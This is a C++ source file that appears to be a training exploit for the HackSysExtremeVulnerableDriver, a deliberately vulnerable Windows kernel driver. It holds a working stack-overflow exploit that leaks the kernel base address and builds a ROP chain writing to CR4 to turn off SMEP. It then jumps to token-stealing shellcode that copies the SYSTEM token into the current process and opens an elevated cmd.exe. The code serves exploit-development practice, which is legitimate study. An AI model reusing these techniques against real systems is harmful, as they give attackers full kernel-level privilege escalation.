
#include "ExploitClasses.h"

std::mutex Syn_Gadgets;

INT64 Hevd_StackOverflow::NtBaseAddress()
{
	LPVOID	pNtBase[ARRAY_SIZE];
	DWORD	needed;
	
	auto fEnumDevics = EnumDeviceDrivers(pNtBase,
		sizeof(pNtBase),
		&needed); 
	if (!fEnumDevics)
	{
		std::cerr << "[-] Getting base address of NT failed" << std::endl;
		return -1;
	}
	
	return (INT64)pNtBase[0];
}

HANDLE Hevd_StackOverflow::FindDevice(_In_ PCSTR DeviceName)
{
	auto hHevdFileHandle = CreateFileA(DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		nullptr);
	if (hHevdFileHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "[-] Getting HEVD.sys device handle failed" << std::endl;
		return INVALID_HANDLE_VALUE;
	}

	return hHevdFileHandle; 
}

// Function that escalte the system 
void Hevd_StackOverflow::HevdExploit(_In_ INT64 offset[])
{

	// Credit to - @Cneelis for this shellcode
	BYTE ShellCode[] =
		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
		"\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd> u PsGetCurrentProcess)
		"\x4D\x8B\x88\xf0\x02\x00\x00"              // mov r9, [r8 + 2f0h]      ; ActiveProcessLinks list head
		"\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
		//find_system_proc:
		"\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
		"\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
		"\x74\x05"                                  // jz found_system          ; Found SYSTEM token
		"\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
		"\xEB\xF1"                                  // jmp find_system_proc     ; Loop
		//found_system:
		"\x48\x8B\x41\x68"                          // mov rax, [rcx + 68h]     ; Offset from ActiveProcessLinks to Token
		"\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
		"\x49\x89\x80\x58\x03\x00\x00"              // mov [r8 + 358h], rax     ; Copy SYSTEM token to current process's token
		"\x48\x83\xC4\x40"                          // add rsp, 040h
		"\x48\x31\xF6"                              // xor rsi, rsi             ; Zeroing out rsi register to avoid Crash
		"\x48\x31\xC0"                              // xor rax, rax             ; NTSTATUS Status = STATUS_SUCCESS
		"\xc3";

	LPVOID	ShellCode_Address;
	PDWORD	OldProtection = 0x0;

	ShellCode_Address = VirtualAlloc(nullptr,
		sizeof(ShellCode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (ShellCode_Address == nullptr)
	{
		std::cout << "[-] Allocate virtual address space for shellcode failed" << std::endl;
		return;
	}

	RtlCopyMemory(ShellCode_Address, ShellCode, sizeof(ShellCode));

	BYTE buffer[2088] = { 0 };

	memset(buffer, '\x41', 2056);

	std::thread* Syn_thread = new std::thread(BypassSmep, buffer, offset);
	Syn_thread->join();
	RtlCopyMemory(buffer + 2080, (PINT64)&ShellCode_Address, 8); // Return to shellcode 
	
	auto DeviceObject = FindDevice("\\\\.\\HackSysExtremeVulnerableDriver");

	DWORD bytes;
	auto DEVICE_IO_CONTROL = DeviceIoControl(DeviceObject,
		HEVD_IOCTL_STACKOVERFLOW,
		buffer,
		sizeof(buffer),
		nullptr,
		0,
		&bytes,
		(LPOVERLAPPED)nullptr);

	// if 1 failed 
	if (!DEVICE_IO_CONTROL)
	{
		std::cout << "[-] Create Device failed" << std::endl;
		return;
	}
	
	std::cout << "[+] Tareget exploited succefully" << std::endl; 
}


void Hevd_StackOverflow::BypassSmep(_In_ BYTE buffer[], _In_ INT64 offset[])
{
	Syn_Gadgets.lock();
	auto NtBase = NtBaseAddress();
	
	auto POP_RCX = NtBase + offset[0];
	auto MOV_CR4_RCX = NtBase + offset[1];

	auto RCX_VALUE = 0x70678;
	
	std::cout << "[+] [NT Base] : " << std::hex << NtBase << std::endl; 
	std::cout << "[+] [POP RCX] - Gadget_1 : " << std::hex << NtBase + offset[0] << std::endl;
	std::cout << "[+] [MOV CR4, RCX] - Gadget_2: " << std::hex << NtBase + offset[1] << std::endl;
	
	RtlCopyMemory(buffer + 2056, (PINT64)&POP_RCX, 8); // Pop rcx
	RtlCopyMemory(buffer + 2064, (PINT64)&RCX_VALUE, 8); // Moving value that bypasses SMEP 20th bit 
	RtlCopyMemory(buffer + 2072, (PINT64)&MOV_CR4_RCX, 8); // Moving rcx into cr4 register 
	Syn_Gadgets.unlock();
}

void Hevd_StackOverflow::SpawnCmdShell()
{
	std::cout << "[+] Spawning CMD.exe shell" << std::endl;
	
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(si));
	
	CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);
}
